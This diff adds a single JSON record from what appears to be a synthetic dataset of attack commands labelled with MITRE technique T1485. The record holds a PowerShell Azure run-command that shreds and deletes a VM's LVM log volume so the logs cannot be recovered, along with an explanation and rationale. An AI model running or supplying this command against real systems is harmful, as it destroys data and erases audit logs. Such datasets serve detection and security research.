@@ -1,0 +1,21 @@
+{
+  "technique_id": "T1485",
+  "platform": "IaaS",
+  "shell": "PowerShell",
+  "command": "Invoke-AzVMRunCommand -ResourceGroupName 'RG-Logs' -Name 'LinVM-LVM' -CommandId 'RunShellScript' -ScriptString \"shred -v -n 3 -z /dev/mapper/vg_data-lv_logs && lvremove -f /dev/mapper/vg_data-lv_logs\"",
+  "explanation": "Overwrites the LVM logical volume vg_data/lv_logs and then removes it, ensuring the log data is destroyed before deallocation.",
+  "rationale_steps": [
+    "Target the log LV device for direct block-level overwrite.",
+    "Securely overwrite the LV and then remove the logical volume to prevent recovery."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1485-28d85ee8-d6ff1c7f",
+  "source_prompt_hash": "28d85ee8",
+  "timestamp_utc": "2025-09-30T08:03:27.709996Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
